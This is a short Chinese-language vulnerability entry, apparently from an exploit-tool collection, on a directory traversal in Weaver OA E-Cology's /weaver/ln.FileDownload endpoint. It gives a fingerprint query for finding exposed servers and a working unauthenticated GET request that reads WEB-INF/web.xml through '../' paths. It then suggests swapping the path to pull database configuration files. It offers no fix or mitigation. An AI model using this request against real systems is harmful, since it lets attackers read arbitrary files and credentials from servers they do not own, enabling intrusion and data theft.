---
source: "LittleBear4/OA-EXPTOOL"
---

# 泛微OA ln.FileDownload 目录遍历漏洞

## 漏洞描述

泛微OA E-Cology 的 `/weaver/ln.FileDownload` 接口中 `fpath` 参数存在目录遍历/本地文件包含漏洞，未对路径中的 `../` 做有效过滤。攻击者无需登录，通过构造遍历路径即可读取服务器上的任意文件（如 `WEB-INF/web.xml`）。

## 漏洞影响

```
泛微OA E-Cology
```

## 网络测绘

```
app="泛微-协同办公OA"
```

## 漏洞复现

```
GET /weaver/ln.FileDownload?fpath=../ecology/WEB-INF/web.xml HTTP/1.1
```

若响应状态码为 200 且返回内容包含 `version` 等 web.xml 特征字段，则漏洞存在。可替换路径读取其他敏感文件，如数据库配置文件。
